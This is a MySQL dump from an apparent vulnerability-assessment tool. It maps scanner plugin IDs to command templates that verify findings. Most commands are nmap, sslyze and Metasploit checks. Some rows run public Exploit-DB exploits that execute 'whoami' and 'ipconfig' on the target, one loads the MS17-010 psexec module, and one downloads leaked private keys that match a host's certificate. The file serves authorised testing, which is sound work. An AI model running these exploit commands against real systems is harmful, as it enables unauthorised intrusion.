-- MySQL dump 10.17  Distrib 10.3.22-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: vapt
-- ------------------------------------------------------
-- Server version	10.3.22-MariaDB-1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `command`
--

DROP TABLE IF EXISTS `command`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `command` (
  `command_id` int(11) NOT NULL AUTO_INCREMENT,
  `parameter` text NOT NULL,
  PRIMARY KEY (`command_id`)
) ENGINE=InnoDB AUTO_INCREMENT=48 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `command`
--

LOCK TABLES `command` WRITE;
/*!40000 ALTER TABLE `command` DISABLE KEYS */;
INSERT INTO `command` VALUES (1,'empty'),(2,'timeout 30 openssl s_client -showcerts -connect IP_ADDRESS:PORT'),(3,'nmap --script +ssl-enum-ciphers -sV IP_ADDRESS -p PORT'),(4,'sslyze --certinfo IP_ADDRESS:PORT'),(5,'nmap --script +ssl-dh-params -sV IP_ADDRESS -p PORT'),(6,'nslookup qq.com -port=PORT && nmap -sU -p PORT --script dns-cache-snoop.nse IP_ADDRESS'),(7,'nmap --script +http-internal-ip-disclosure -sV IP_ADDRESS -p PORT'),(8,'nmap --script +sslv2-drown -sV IP_ADDRESS -p PORT'),(9,'nmap --script +ssl-poodle -sV IP_ADDRESS -p PORT'),(10,'whatweb IP_ADDRESS:PORT\r\n'),(11,'nmap --script +http-methods -sV IP_ADDRESS -p PORT'),(12,'nmap --script +ssl-heartbleed -sV IP_ADDRESS -p PORT'),(13,'nmap --script +ssl-ccs-injection -sV IP_ADDRESS -p PORT'),(14,'nmap --script +rdp-enum-encryption -sV -p PORT IP_ADDRESS'),(15,'nmap --script +smb-security-mode.nse -sV -p PORT IP_ADDRESS'),(16,'(echo \'\' > RANDOM_PATH; echo \'use auxiliary/scanner/smb/smb_version\' >> RANDOM_PATH; echo \'set rhosts IP_ADDRESS\' >> RANDOM_PATH; echo \'set rport PORT\' >> RANDOM_PATH; echo \'run\' >> RANDOM_PATH; echo \'exit\' >> RANDOM_PATH; msfconsole -r RANDOM_PATH; rm RANDOM_PATH;)'),(17,'nmap -sS -sV -p PORT IP_ADDRESS'),(18,'curl -k -L -s https://IP_ADDRESS:PORT | grep -A 2 -B 3 smhversion'),(19,'nmap -sU -sV -p PORT IP_ADDRESS'),(20,'nmap -sT -sU -sV -p PORT IP_ADDRESS'),(21,'nmap --script +smtp-enum-users --script-args methods={EXPN,VRFY} -p PORT IP_ADDRESS'),(22,'curl -s -k -L http://IP_ADDRESS:PORT/eccgs/eccgs-404-error-page.html \\| grep \"Apache Tomcat\\|Pivotal tc Runtime\"'),(23,'tools/rdp-sec-check/rdp-sec-check.pl IP_ADDRESS:PORT'),(24,'sslyze --regular IP_ADDRESS:PORT'),(25,'(echo \'\' > RANDOM_PATH; echo \'use exploit/windows/smb/ms17_010_psexec\' >> RANDOM_PATH; echo \'set rhosts IP_ADDRESS\' >> RANDOM_PATH; echo \'set rport PORT\' >> RANDOM_PATH; echo \'check\' >> RANDOM_PATH; echo \'exit\' >> RANDOM_PATH; msfconsole -r RANDOM_PATH; rm RANDOM_PATH;)'),(26,'nmap -sS -sV --script +smb-protocols -p PORT IP_ADDRESS'),(27,'nmap -sS -sV --script +http-vuln-cve2015-1635 -p PORT IP_ADDRESS'),(28,'(echo \'\' > RANDOM_PATH; echo \'use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\' >> RANDOM_PATH; echo \'set rhosts IP_ADDRESS\' >> RANDOM_PATH; echo \'set rport PORT\' >> RANDOM_PATH; echo \'run\' >> RANDOM_PATH; echo \'exit\' >> RANDOM_PATH; msfconsole -r RANDOM_PATH; rm RANDOM_PATH;)'),(29,'(echo \'\' > RANDOM_PATH; echo \'use auxiliary/scanner/vmware/esx_fingerprint\' >> RANDOM_PATH; echo \'set rhosts IP_ADDRESS\' >> RANDOM_PATH; echo \'run\' >> RANDOM_PATH; echo \'exit\' >> RANDOM_PATH; msfconsole -r RANDOM_PATH; rm RANDOM_PATH;)'),(30,'(echo \'\' > RANDOM_PATH; echo \'use exploit/windows/misc/hp_dataprotector_cmd_exec\' >> RANDOM_PATH; echo \'set rhosts IP_ADDRESS\' >> RANDOM_PATH; echo \'set rport PORT\' >> RANDOM_PATH; echo \'check\' >> RANDOM_PATH; echo \'exit\' >> RANDOM_PATH; msfconsole -r RANDOM_PATH; rm RANDOM_PATH;)'),(31,'enum4linux IP_ADDRESS PORT | grep -B 1 -A 3 \"Session Check\"'),(32,'showmount --exports IP_ADDRESS'),(33,'nmap -O -sV IP_ADDRESS'),(34,'(echo \'\' > RANDOM_PATH; echo \'use exploit/multi/misc/hp_data_protector_exec_integutil\' >> RANDOM_PATH; echo \'set rhosts IP_ADDRESS\' >> RANDOM_PATH; echo \'set rport PORT\' >> RANDOM_PATH; echo \'check\' >> RANDOM_PATH; echo \'exit\' >> RANDOM_PATH; msfconsole -r RANDOM_PATH; rm RANDOM_PATH;)'),(35,'nmap -sS -sV --script +http-headers -p PORT IP_ADDRESS'),(36,'nmap -sV --script +tls-ticketbleed IP_ADDRESS -p PORT'),(37,'nmap -sV --script +pop3-capabilities -p PORT IP_ADDRESS'),(38,'nmap --script +smtp-commands -sV -p PORT IP_ADDRESS'),(39,'(echo \'#!/bin/bash\' > RANDOM_PATH; echo \"( sleep 5; curl -s -k -L http://IP_ADDRESS:PORT/Hewlett-Packard/OpenView/BBC/status | grep -B 2 iframe ) &\" >> RANDOM_PATH; echo \"timeout 10 python2 /usr/share/exploitdb/exploits/multiple/webapps/35076.py IP_ADDRESS https://www.eccgs.com --port PORT\" >> RANDOM_PATH; chmod a+x RANDOM_PATH; ./RANDOM_PATH; rm RANDOM_PATH;)'),(40,'(python2 /usr/share/exploitdb/exploits/windows/remote/27400.py IP_ADDRESS PORT \"whoami\"; python2 /usr/share/exploitdb/exploits/windows/remote/27400.py IP_ADDRESS PORT \"ipconfig\";)'),(41,'(echo \'#!/bin/bash\' > RANDOM_PATH; echo \'temp=$(echo | openssl s_client -connect IP_ADDRESS:PORT 2>/dev/null | openssl x509 -noout -fingerprint -sha256)\' >> RANDOM_PATH; echo \'temp2=${temp//\\:/}\' >> RANDOM_PATH; echo \'temp3=${temp2//SHA256 Fingerprint=/}\' >> RANDOM_PATH; echo \'temp4=${temp3,,}\' >> RANDOM_PATH; echo \'curl -s -k -L https://raw.githubusercontent.com/sec-consult/houseofkeys/master/certificates/${temp4}.key\' >> RANDOM_PATH; echo \'curl -s -k -L https://raw.githubusercontent.com/sec-consult/houseofkeys/master/certificates/${temp4}.pem;\' >> RANDOM_PATH; chmod a+x RANDOM_PATH; ./RANDOM_PATH; rm RANDOM_PATH;)'),(42,'nmap -sV --script +vmware-version -p PORT IP_ADDRESS'),(43,'nmap -sV --script +sshv1 IP_ADDRESS -p PORT'),(44,'ntpq -c rv IP_ADDRESS'),(45,'python2 /usr/share/exploitdb/exploits/windows/remote/39858.py -p PORT IP_ADDRESS -c \'whoami\'; python2 /usr/share/exploitdb/exploits/windows/remote/39858.py -p PORT IP_ADDRESS -c \'ipconfig\'\n'),(46,'(echo \'\' > RANDOM_PATH; echo \'use auxiliary/scanner/rdp/ms12_020_check\' >> RANDOM_PATH; echo \'set rhosts IP_ADDRESS\' >> RANDOM_PATH; echo \'set rport PORT\' >> RANDOM_PATH; echo \'check\' >> RANDOM_PATH; echo \'exit\' >> RANDOM_PATH; msfconsole -r RANDOM_PATH; rm RANDOM_PATH;)'),(47,'nmap --script +ssh2-enum-algos -sV IP_ADDRESS -p PORT\n');
/*!40000 ALTER TABLE `command` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `plugin`
--

DROP TABLE IF EXISTS `plugin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `plugin` (
  `plugin_id` int(11) NOT NULL,
  `command_id` int(11) NOT NULL,
  PRIMARY KEY (`plugin_id`),
  KEY `command_id` (`command_id`),
  CONSTRAINT `plugin_ibfk_1` FOREIGN KEY (`command_id`) REFERENCES `command` (`command_id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `plugin`
--

LOCK TABLES `plugin` WRITE;
/*!40000 ALTER TABLE `plugin` DISABLE KEYS */;
INSERT INTO `plugin` VALUES (20284,1),(32320,1),(32358,1),(32359,1),(33388,1),(33389,1),(33850,1),(33941,1),(34094,1),(36382,1),(36589,1),(36749,1),(36805,1),(36904,1),(36907,1),(36916,1),(37152,1),(37654,1),(37762,1),(37886,1),(37936,1),(37965,1),(39363,1),(39371,1),(39786,1),(39789,1),(39800,1),(40417,1),(40529,1),(40576,1),(40655,1),(40656,1),(40657,1),(41045,1),(41968,1),(42050,1),(42408,1),(42858,1),(43622,1),(43898,1),(44107,1),(44108,1),(44585,1),(45037,1),(45038,1),(45343,1),(45550,1),(46855,1),(47035,1),(47108,1),(47109,1),(47110,1),(47695,1),(48282,1),(48283,1),(49102,1),(49236,1),(49305,1),(49306,1),(49644,1),(49803,1),(50560,1),(50649,1),(50823,1),(51076,1),(51572,1),(51584,1),(51871,1),(52529,1),(52581,1),(52667,1),(53257,1),(54301,1),(55087,1),(55092,1),(55414,1),(55648,1),(55699,1),(55759,1),(55786,1),(55859,1),(56070,1),(56213,1),(56281,1),(56506,1),(56554,1),(56629,1),(56778,1),(56970,1),(57082,1),(57314,1),(57315,1),(57541,1),(57615,1),(57887,1),(57932,1),(57998,1),(58131,1),(58145,1),(58168,1),(58318,1),(58325,1),(58333,1),(58443,1),(58600,1),(58617,1),(58618,1),(58743,1),(58872,1),(58974,1),(59016,1),(59170,1),(59225,1),(59385,1),(59526,1),(59554,1),(59856,1),(61485,1),(61607,1),(61706,1),(62179,1),(62219,1),(62388,1),(62619,1),(62985,1),(62988,1),(63109,1),(63155,1),(63164,1),(63200,1),(63285,1),(63467,1),(63478,1),(63536,1),(64616,1),(64784,1),(64798,1),(64928,1),(64969,1),(65057,1),(65109,1),(65607,1),(65730,1),(65818,1),(66427,1),(66428,1),(69552,1),(72691,1),(72692,1),(74246,1),(74247,1),(77162,1),(77475,1),(78447,1),(81264,1),(81650,1),(82820,1),(83471,1),(83526,1),(83764,1),(84738,1),(84801,1),(84824,1),(86149,1),(86403,1),(86542,1),(87252,1),(87253,1),(87313,1),(87918,1),(88045,1),(88936,1),(89831,1),(90625,1),(90828,1),(91097,1),(92035,1),(92516,1),(94072,1),(94138,1),(94578,1),(95438,1),(96003,1),(96453,1),(96628,1),(97794,1),(97888,1),(99289,1),(99367,1),(99374,1),(99588,1),(99756,1),(100681,1),(100767,1),(101843,1),(102428,1),(103329,1),(103698,1),(103782,1),(103963,1),(104627,1),(104892,1),(106190,1),(106975,1),(107449,1),(107475,1),(107476,1),(107477,1),(107484,1),(107485,1),(107554,1),(107555,1),(107565,1),(107571,1),(107595,1),(107603,1),(107609,1),(107631,1),(107633,1),(107634,1),(107648,1),(107660,1),(107681,1),(107707,1),(107718,1),(107719,1),(107720,1),(107721,1),(107722,1),(107759,1),(107761,1),(107780,1),(107781,1),(107786,1),(107787,1),(107789,1),(107790,1),(107791,1),(107792,1),(107793,1),(107794,1),(109071,1),(109072,1),(109073,1),(109074,1),(109075,1),(109076,1),(109173,1),(109174,1),(109175,1),(109176,1),(109202,1),(109856,1),(109882,1),(109911,1),(111114,1),(111115,1),(111116,1),(111117,1),(111118,1),(111122,1),(111123,1),(111163,1),(111188,1),(111189,1),(111190,1),(111191,1),(117481,1),(117683,1),(118060,1),(118061,1),(118062,1),(118131,1),(118132,1),(118188,1),(118228,1),(119684,1),(121035,1),(121116,1),(121117,1),(121118,1),(121119,1),(121120,1),(121174,1),(121175,1),(121176,1),(121177,1),(121178,1),(121231,1),(121514,1),(122246,1),(122617,1),(122778,1),(122853,1),(123131,1),(124064,1),(124073,1),(124074,1),(124075,1),(124076,1),(124198,1),(124279,1),(124460,1),(125058,1),(125074,1),(125164,1),(125371,1),(125729,1),(125816,1),(125884,1),(125952,1),(126577,1),(126600,1),(126601,1),(126615,1),(126716,1),(126717,1),(126718,1),(126719,1),(126720,1),(126721,1),(126722,1),(126723,1),(126724,1),(126725,1),(126753,1),(126764,1),(126821,1),(127120,1),(127129,1),(127850,1),(127910,1),(128328,1),(128637,1),(128741,1),(128742,1),(129054,1),(129719,1),(129848,1),(129869,1),(129870,1),(129871,1),(129872,1),(130006,1),(130011,1),(130275,1),(130463,1),(130508,1),(130509,1),(130906,1),(130909,1),(130912,1),(131022,1),(131190,1),(131738,1),(131927,1),(131930,1),(131936,1),(131954,1),(132097,1),(132101,1),(132717,1),(132858,1),(132863,1),(132868,1),(132890,1),(132891,1),(132892,1),(132893,1),(132894,1),(132895,1),(132992,1),(132999,1),(133048,1),(133049,1),(133053,1),(133208,1),(133465,1),(133611,1),(133615,1),(133619,1),(133673,1),(133845,1),(133848,1),(133954,1),(134215,1),(134369,1),(134701,1),(134706,1),(135094,1),(20007,3),(26928,3),(31705,3),(42873,3),(65821,3),(66848,3),(79638,3),(81606,3),(91572,3),(104743,3),(121010,3),(35291,4),(83738,5),(83875,5),(12217,6),(10759,7),(77026,7),(89058,8),(78479,9),(80035,9),(34460,10),(11213,11),(73412,12),(74326,13),(77200,13),(57690,14),(57608,15),(58327,16),(90509,16),(125388,16),(10203,17),(10205,17),(42263,17),(44589,17),(58987,17),(64532,17),(76791,17),(78555,17),(85885,17),(97994,17),(101787,17),(102431,17),(119780,17),(72959,18),(73639,18),(76345,18),(78090,18),(84923,18),(85181,18),(90150,18),(90251,18),(91222,18),(94654,18),(103530,18),(10043,19),(10891,19),(41028,19),(10061,20),(10249,21),(12085,22),(18405,23),(30218,23),(58453,23),(15901,24),(45411,24),(51192,24),(57582,24),(69551,24),(97833,25),(99439,25),(100464,26),(82828,27),(125313,28),(105486,29),(111759,29),(118466,29),(118885,29),(123518,29),(76616,30),(26920,31),(42256,32),(84729,33),(108797,33),(79233,34),(88098,35),(97191,36),(15855,37),(18391,38),(54582,38),(78628,39),(53641,40),(121008,41),(111760,42),(10882,43),(97861,44),(90796,45),(58435,46),(70658,47),(71049,47),(90317,47);
/*!40000 ALTER TABLE `plugin` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-04-10 16:46:21
